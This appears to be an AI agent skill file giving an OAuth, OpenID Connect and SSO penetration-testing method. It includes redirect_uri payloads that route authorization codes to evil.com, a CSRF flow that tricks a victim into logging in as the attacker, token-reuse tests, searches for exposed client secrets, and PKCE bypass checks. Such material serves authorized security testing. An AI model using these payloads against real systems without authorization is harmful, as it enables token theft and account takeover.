---
name: oauth-sso
description: >
  OAuth 2.0 / OpenID Connect / SSO attack methodology. redirect_uri
  manipulation, state parameter bypass, CSRF on authorization endpoint,
  code/access_token interception, PKCE bypass, implicit flow hijack,
  and cross-tenant token reuse.
metadata:
  tags: "oauth,sso,oidc,redirect-uri,csrf,state,token-hijack"
  category: "offensive-security"
---

# OAuth / SSO Attack — 单点登录攻击

## Attack Surface Check

```
检测到 OAuth/SSO?
├── 登录页有第三方登录按钮 (Google/GitHub/微信/企业微信/钉钉)?
├── URL 中有 client_id / redirect_uri / response_type 参数?
├── /.well-known/openid-configuration 存在?
├── 响应头中有 OAuth/SSO 相关字段?
└── 有多个子域名 → 跨域 SSO token 可能共享?
```

## 1. redirect_uri 操纵 (最高回报)

```
原始请求:
  https://auth.target.com/authorize?
    client_id=app123&
    redirect_uri=https://app.target.com/callback&
    response_type=code

攻击尝试:
  # 开放重定向 (如果 redirect_uri 校验宽松)
  redirect_uri=https://app.target.com.evil.com/callback
  redirect_uri=https://app.target.com@evil.com/callback
  
  # 子域名绕过 (如果有可控子域)
  redirect_uri=https://attacker-controlled.target.com/callback
  
  # 路径穿越
  redirect_uri=https://app.target.com/../evil/callback
  
  # CRLF 注入
  redirect_uri=https://evil.com%0d%0aHost:%20app.target.com
  
  # 参数污染
  redirect_uri=https://app.target.com/callback&redirect_uri=https://evil.com
  
  # localhost bypass (开发环境)
  redirect_uri=http://localhost:8080/callback
  redirect_uri=http://127.0.0.1/callback
```

## 2. state 参数

```
如果 state 参数缺失或不验证:
  → CSRF: 攻击者用自己的 code 绑定受害者账号
  → 流程: 攻击者启动 OAuth → 拿自己的 code →
          构造 https://app.target.com/callback?code=ATTACKER_CODE →
          诱导受害者点击 → 受害者登录了攻击者的身份

检测:
  □ 授权请求中是否有 state 参数?
  □ 回调时 state 是否被验证?
  □ 是否可以去除 state 参数?
```

## 3. Code / Token 窃取

```
# Code 重用 (code 是否一次性?)
1. 用合法方式获取授权码 code_abc
2. 重复使用 code_abc 多次获取 token
3. 如果能获取多个 token → code 未销毁

# 客户端凭证泄露
从 JS 中搜索:
  client_id, client_secret, app_secret
  redirect_uri 白名单
  OAuth 端点 URL

# Implicit Flow token 泄露
如果使用 implicit flow (response_type=token):
  token 在 URL hash 中 → 可能被 Referer header 泄露
  或被浏览器历史/日志记录
```

## 4. PKCE 绕过

```
如果使用 PKCE (Proof Key for Code Exchange):
  □ 是否强制 PKCE? (可以去掉 code_challenge 参数?)
  □ code_verifier 是否被正确验证?
  □ 可以用 plain 方法代替 S256 吗?
```

## 5. SSO Token 跨域重用

```
企业 SSO (企业微信/钉钉/飞书):
  □ 同一个 SSO token 能否跨业务系统使用?
  □ A 系统的 token → B 系统的 API?
  □ 不同角色的 token 权限是否隔离?

多子域名场景:
  app.target.com 的 token → admin.target.com 的 API?
  dev.target.com 的 token → prod.target.com?
```

## 6. OpenID Connect 配置泄露

```bash
# 获取 OIDC 配置 (可能暴露内部端点)
curl https://target/.well-known/openid-configuration

# 关注:
#   authorization_endpoint
#   token_endpoint
#   userinfo_endpoint
#   jwks_uri  (→ 跳转到 JWT Attack)
#   registration_endpoint (可能允许动态注册客户端!)
```

## 7. Quick Test Checklist

```
□ 检查 OAuth URL 中是否有 redirect_uri 参数
□ 尝试 redirect_uri 绕过 (子域名/路径穿越/CRLF)
□ 检查 state 参数存在性和验证
□ Code 重用测试
□ 搜索 JS 中的 client_secret
□ 请求 /.well-known/openid-configuration
□ SSO token 跨子域/跨业务测试
□ PKCE bypass (去掉 code_challenge)
□ 检查是否有动态客户端注册端点
```
